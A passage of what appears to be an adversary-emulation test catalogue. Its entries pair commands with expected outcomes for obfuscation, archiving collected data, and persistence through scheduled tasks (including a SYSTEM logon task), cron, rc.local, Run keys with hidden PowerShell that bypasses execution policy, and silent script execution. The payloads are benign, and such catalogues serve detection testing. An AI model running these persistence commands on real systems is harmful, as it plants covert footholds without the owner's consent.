attacks.expected_behavior: A file $HOME/obf.txt is created with the content "Hello, world!". The command succeeds without requiring admin rights.

attacks.description: Writes a hidden shell script using hexadecimal escape sequences (obfuscating the script text) and makes it executable.
attacks.expected_behavior: A file $HOME/.hidden_script is created containing a shebang and an echo command that prints "Secret Message". The file becomes executable. No admin rights are needed.

attacks.command: echo 'Sensitive data' | openssl enc -aes-256-cbc -a -salt -pass pass:MySecret > $HOME/enc.txt && openssl enc -d -aes-256-cbc -a -salt -pass pass:MySecret -in $HOME/enc.txt -out $HOME/dec.txt
attacks.description: Encrypts a string with OpenSSL using a password, storing the ciphertext in a file, then decrypts it back to verify the obfuscation.
attacks.expected_behavior: Two files are created: $HOME/enc.txt containing the Base64‑encoded encrypted payload, and $HOME/dec.txt containing the original plaintext "Sensitive data" after decryption. No elevated privileges are required.

attacks.description: Create a dummy text file and archive it into a ZIP file using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: A file named sample.txt is created in the TEMP directory and then compressed into collected.zip located in the same directory.

attacks.description: Generate two sample files and archive them together into a TAR file using the built‑in tar utility.
attacks.expected_behavior: Two files (file1.txt, file2.txt) are created in the TEMP folder and then packaged into collected.tar in the same location.

attacks.command: powershell -Command \"mkdir $env:TEMP\\CollectedData -ErrorAction SilentlyContinue; Set-Content -Path $env:TEMP\\CollectedData\\log1.txt -Value 'log entry'; Set-Content -Path $env:TEMP\\CollectedData\\log2.txt -Value 'log entry 2'; Compress-Archive -Path $env:TEMP\\CollectedData\\* -DestinationPath $env:TEMP\\CollectedData.zip -CompressionLevel Optimal -Force\"
attacks.description: Create a temporary directory, place multiple dummy log files inside, and compress the entire directory into a ZIP archive with optimal compression.
attacks.expected_behavior: A folder named CollectedData is created under TEMP, two log files are added, and the folder contents are archived into CollectedData.zip.

attacks.description: Create a gzip‑compressed tar archive of the collected data directory.
attacks.expected_behavior: A file named data_archive.tar.gz is created in /tmp containing the contents of /tmp/collected_data.

attacks.description: Create a password‑protected zip archive of the collected data.
attacks.expected_behavior: A zip file named data_archive.zip is created in /tmp; extracting it requires the password P@ssw0rd.

attacks.description: Use find and cpio to create a newc format archive, then compress it with gzip.
attacks.expected_behavior: A compressed cpio archive named data_archive.cpio.gz appears in /tmp, containing the files from /tmp/collected_data.

attacks.description: Creates a one‑time scheduled task that runs a harmless echo command to write "Hello" to a file in the temporary directory.
attacks.expected_behavior: The task appears in Task Scheduler; when the scheduled time arrives, %TEMP%\hello.txt is created containing the text "Hello".

attacks.description: Creates a daily task that runs a hidden PowerShell command to write the current date and time to a temporary file, executing under the current user account.
attacks.expected_behavior: Each day at noon the task runs, updating %TEMP%\date.txt with the current timestamp.

attacks.command: powershell -Command "$xml = '<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers><Principals><Principal id=\"Author\"><UserId>SYSTEM</UserId><LogonType>ServiceAccount</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><Enabled>true</Enabled></Settings><Actions Context=\"Author\"><Exec><Command>cmd.exe</Command><Arguments>/c echo Advanced > %TEMP%\\advanced.txt</Arguments></Exec></Actions></Task>'; Set-Content -Path "$env:TEMP\\sysTask.xml" -Value $xml -Encoding Unicode; schtasks /Create /TN "SysTask" /XML "$env:TEMP\\sysTask.xml" /F"
attacks.description: Generates an XML definition for a scheduled task that runs under the SYSTEM account and imports it, creating a task that writes a test string to a temp file when any user logs on.
attacks.expected_behavior: The XML file is written to %TEMP%\sysTask.xml, then schtasks registers a new task "SysTask". On the next logon, the task executes and creates %TEMP%\advanced.txt containing the word "Advanced".

attacks.description: Adds a user‑level cron entry that runs every minute and creates a test file in the user's home directory, demonstrating persistence via a scheduled task.
attacks.expected_behavior: A new cron job is installed; each minute the system executes '/usr/bin/touch $HOME/.cron_test', creating or updating the file.

attacks.description: Installs a system‑wide cron job in /etc/cron.d that runs every five minutes as root, touching a file in /var/tmp, representing a privileged scheduled task.
attacks.expected_behavior: Cron daemon reads the new file; every five minutes it executes '/usr/bin/touch /var/tmp/root_cron_test' with root privileges, creating or updating the file.

attacks.description: Adds a Run key under the current user hive that launches Notepad at each user logon.
attacks.expected_behavior: When the current user logs on, Windows reads the HKCU Run key and automatically starts Notepad.

attacks.description: Creates a system‑wide Run key that launches Notepad for every user logon.
attacks.expected_behavior: On any user logon, Windows reads the HKLM Run key and starts Notepad, providing persistence across all accounts.

attacks.command: powershell -Command "$scriptPath = \"$env:TEMP\payload.ps1\"; Set-Content -Path $scriptPath -Value 'Start-Process notepad.exe' -Encoding ASCII -ErrorAction SilentlyContinue; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'TempScript' -Value \"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \$scriptPath\" -ErrorAction SilentlyContinue"
attacks.description: Creates a temporary PowerShell script in %TEMP% that launches Notepad, then adds a Run key pointing to that script.
attacks.expected_behavior: At each logon, the Run key executes the hidden PowerShell script, which in turn starts Notepad. The script file remains in the temporary directory.

attacks.description: Creates a .desktop autostart entry in the user's profile that runs a benign command at login, mimicking a Registry Run Key persistence mechanism.
attacks.expected_behavior: A file named malicious.desktop is written to $HOME/.config/autostart; the desktop environment will execute /usr/bin/true on the next user login.

attacks.description: Appends a command to /etc/rc.local and ensures the script is executable, achieving system‑wide persistence akin to a Run Key but requiring root privileges.
attacks.expected_behavior: The line '/usr/bin/true' is added to /etc/rc.local; the script will be executed on each boot, providing persistence.

attacks.description: Creates a simple batch file in the TEMP folder that prints 'Hello' and immediately runs it, demonstrating user execution of a malicious file.
attacks.expected_behavior: A batch file is written to %TEMP% and executed, resulting in the text 'Hello' being displayed in a command window.

attacks.description: Writes a placeholder Base64 string to a .b64 file, decodes it to a benign .exe using certutil, and launches the executable, emulating a user double‑clicking a dropped malicious executable.
attacks.expected_behavior: certutil creates a dummy executable file in %TEMP% and the start command runs it; the dummy exe would display a harmless message or open a standard program.

attacks.command: powershell -Command "$vbs = 'Set WshShell = CreateObject(\"WScript.Shell\"): WshShell.Run \"calc.exe\",0,False'; $path = \"$env:TEMP\\malicious.vbs\"; Set-Content -Path $path -Value $vbs -Encoding ASCII; cscript.exe //B //Nologo $path"
attacks.description: Generates a VBS script that silently launches Calculator, writes it to the TEMP directory, and executes it with cscript, representing a malicious script file executed by a user.
attacks.expected_behavior: A VBS file is created in %TEMP% and run via cscript; Calculator (calc.exe) opens briefly, confirming execution of the malicious script.

attacks.description: Creates a simple bash script in /tmp, makes it executable, and runs it, simulating a user executing a malicious file they saved locally.
attacks.expected_behavior: The script prints 'Malicious payload executed' to the console, demonstrating execution of a user‑provided file.

attacks.description: Downloads a script from a remote URL into /tmp, marks it executable, and runs it, representing a user executing a downloaded malicious file.
attacks.expected_behavior: Assuming the URL returns a harmless script that echoes a message, the command will download, set execute permission, and display the message, showing user execution of a fetched file.
